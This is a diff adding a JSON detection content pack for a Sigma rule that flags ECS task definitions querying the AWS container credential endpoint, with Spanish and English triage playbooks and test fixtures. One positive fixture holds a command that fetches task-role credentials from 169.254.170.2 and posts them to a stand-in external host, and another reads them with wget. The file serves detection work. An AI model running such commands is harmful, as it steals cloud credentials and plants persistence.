@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "b94bf91e-c2bf-4047-9c43-c6810f43baad",
+    "title": "AWS ECS Task Definition That Queries The Credential Endpoint",
+    "level": "medium",
+    "status": "test",
+    "author": "Darin Smith",
+    "path": "cloud/aws/cloudtrail/aws_ecs_task_definition_cred_endpoint_query.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/cloud/aws/cloudtrail/aws_ecs_task_definition_cred_endpoint_query.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1525"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un principal de AWS registró, consultó o ejecutó una task definition de ECS cuyo comando de contenedor hace referencia a $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI, la variable que apunta a las credenciales del rol de la tarea. Puede indicar un backdoor que roba las credenciales del task role.",
+      "what_it_detects": "Eventos de CloudTrail con eventSource ecs.amazonaws.com y eventName DescribeTaskDefinition, RegisterTaskDefinition o RunTask, cuyo campo requestParameters.containerDefinitions.command contiene $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.",
+      "why_it_matters": "Un atacante puede agregar a una task definition un comando que consulte el endpoint de credenciales (169.254.170.2) y las envíe fuera, como hace el módulo ecs__backdoor_task_def de Pacu. Así obtiene persistencia y los privilegios del task role (ATT&CK T1525, Implant Internal Image).",
+      "triage_steps": [
+        "Identifique al actor: userIdentity.arn, tipo de identidad, sourceIPAddress y userAgent. Compruebe si es un pipeline de CI/CD o un usuario esperado.",
+        "Lea el comando completo en requestParameters.containerDefinitions.command. Busque curl/wget, destinos externos, codificación base64 o envío de la respuesta a otro host.",
+        "Compare la nueva revisión con la anterior de la misma family (DescribeTaskDefinition) para ver qué cambió, incluidos image, taskRoleArn y variables de entorno.",
+        "Determine los permisos del taskRoleArn asociado y qué recursos podría alcanzar un atacante con esas credenciales.",
+        "Busque en CloudTrail eventos del mismo actor en +/- 15 minutos: ListTaskDefinitions, DescribeTaskDefinition, UpdateService, RunTask, iam:PassRole.",
+        "Verifique si alguna sesión del task role se usó desde sourceIPAddress ajenas a su cuenta o VPC después del evento.",
+        "Revise alertas previas para el mismo principal, la misma IP de origen y el mismo cluster o family."
+      ],
+      "false_positives": [
+        "Task definitions modificadas por razones válidas para solicitar credenciales al Task Metadata Service, por ejemplo scripts de arranque que usan el rol de la tarea.",
+        "Imágenes o scripts de diagnóstico de equipos de plataforma que validan la configuración del task role.",
+        "Pruebas autorizadas de pentest o red team con herramientas como Pacu."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del servicio o del pipeline si el cambio estaba aprobado antes de actuar.",
+        "Si no es legítimo, actualice los servicios a una revisión conocida como buena, detenga las tareas afectadas y desregistre la revisión maliciosa.",
+        "Revoque las sesiones activas del task role (política de denegación con aws:TokenIssueTime) y desactive o rote las credenciales del principal que hizo el cambio.",
+        "Bloquee los destinos externos identificados y revise el uso de las credenciales robadas en CloudTrail.",
+        "Restrinja ecs:RegisterTaskDefinition e iam:PassRole al mínimo necesario y documente el incidente."
+      ],
+      "severity_rationale": "Medium porque existen usos legítimos del endpoint de credenciales, pero un comando inesperado puede exponer las credenciales del task role y dar persistencia."
+    },
+    "en": {
+      "summary": "An AWS principal registered, described or ran an ECS task definition whose container command references $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI, the variable that points to the task role credentials. This may be a backdoor that steals task role credentials.",
+      "what_it_detects": "CloudTrail events with eventSource ecs.amazonaws.com and eventName DescribeTaskDefinition, RegisterTaskDefinition or RunTask where requestParameters.containerDefinitions.command contains $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.",
+      "why_it_matters": "An attacker can add a command to a task definition that queries the credential endpoint (169.254.170.2) and sends the result out, as Pacu's ecs__backdoor_task_def module does. That gives persistence and the task role's privileges (ATT&CK T1525, Implant Internal Image).",
+      "triage_steps": [
+        "Identify the actor: userIdentity.arn, identity type, sourceIPAddress and userAgent. Check whether it is an expected CI/CD pipeline or user.",
+        "Read the full requestParameters.containerDefinitions.command. Look for curl/wget, external destinations, base64 encoding or the response being sent to another host.",
+        "Compare the new revision with the previous revision of the same family (DescribeTaskDefinition), including image, taskRoleArn and environment variables.",
+        "Find out what the taskRoleArn can do and which resources an attacker could reach with those credentials.",
+        "Search CloudTrail for the same actor within +/- 15 minutes: ListTaskDefinitions, DescribeTaskDefinition, UpdateService, RunTask, iam:PassRole.",
+        "Check whether task role sessions were used after the event from a sourceIPAddress outside your accounts or VPCs.",
+        "Review earlier alerts for the same principal, source IP, cluster or task family."
+      ],
+      "false_positives": [
+        "Task definitions changed for valid reasons to request credentials from the Task Metadata Service, such as startup scripts that use the task role.",
+        "Diagnostic images or scripts from platform teams that check the task role configuration.",
+        "Authorized pentest or red team exercises using tools such as Pacu."
+      ],
+      "response_steps": [
+        "Confirm with the service or pipeline owner whether the change was approved before taking action.",
+        "If not legitimate, roll services back to a known-good revision, stop affected tasks and deregister the malicious revision.",
+        "Revoke active task role sessions (deny policy with aws:TokenIssueTime) and disable or rotate credentials of the principal that made the change.",
+        "Block identified external destinations and trace any use of the stolen credentials in CloudTrail.",
+        "Limit ecs:RegisterTaskDefinition and iam:PassRole to least privilege and document the incident."
+      ],
+      "severity_rationale": "Medium because legitimate uses of the credential endpoint exist, but an unexpected command can expose task role credentials and provide persistence."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "RegisterTaskDefinition with a container command that queries the credential endpoint and posts it to an external host",
+        "event": {
+          "eventSource": "ecs.amazonaws.com",
+          "eventName": "RegisterTaskDefinition",
+          "awsRegion": "us-east-1",
+          "sourceIPAddress": "203.0.113.45",
+          "userAgent": "aws-cli/2.15.0 Python/3.11.6 Linux/6.1",
+          "userIdentity.arn": "arn:aws:iam::111122223333:user/dev-jperez",
+          "requestParameters.family": "billing-api",
+          "requestParameters.taskRoleArn": "arn:aws:iam::111122223333:role/billing-api-task",
+          "requestParameters.containerDefinitions.command": "/bin/sh -c curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -s -X POST -d @- https://collector.example.com/in"
+        }
+      },
+      {
+        "description": "RunTask overriding the command to read task role credentials",
+        "event": {
+          "eventSource": "ecs.amazonaws.com",
+          "eventName": "RunTask",
+          "awsRegion": "eu-west-1",
+          "sourceIPAddress": "198.51.100.23",
+          "userAgent": "Boto3/1.34.10 Python/3.10.12",
+          "userIdentity.arn": "arn:aws:sts::111122223333:assumed-role/ops-admin/session-mlopez",
+          "requestParameters.cluster": "prod-cluster",
+          "requestParameters.containerDefinitions.command": "wget -qO- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate RegisterTaskDefinition that only queries the task metadata endpoint, not the credential endpoint",
+        "event": {
+          "eventSource": "ecs.amazonaws.com",
+          "eventName": "RegisterTaskDefinition",
+          "awsRegion": "us-east-1",
+          "sourceIPAddress": "192.0.2.10",
+          "userAgent": "terraform/1.7.0",
+          "userIdentity.arn": "arn:aws:sts::111122223333:assumed-role/ci-deployer/pipeline",
+          "requestParameters.family": "billing-api",
+          "requestParameters.containerDefinitions.command": "/bin/sh -c curl -s $ECS_CONTAINER_METADATA_URI_V4/task && exec /app/start.sh"
+        }
+      },
+      {
+        "description": "Credential URI string in a command but from a non-ECS event source",
+        "event": {
+          "eventSource": "batch.amazonaws.com",
+          "eventName": "RegisterJobDefinition",
+          "awsRegion": "us-east-1",
+          "sourceIPAddress": "192.0.2.11",
+          "userIdentity.arn": "arn:aws:iam::111122223333:user/data-eng",
+          "requestParameters.containerDefinitions.command": "python /app/check_role.py $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
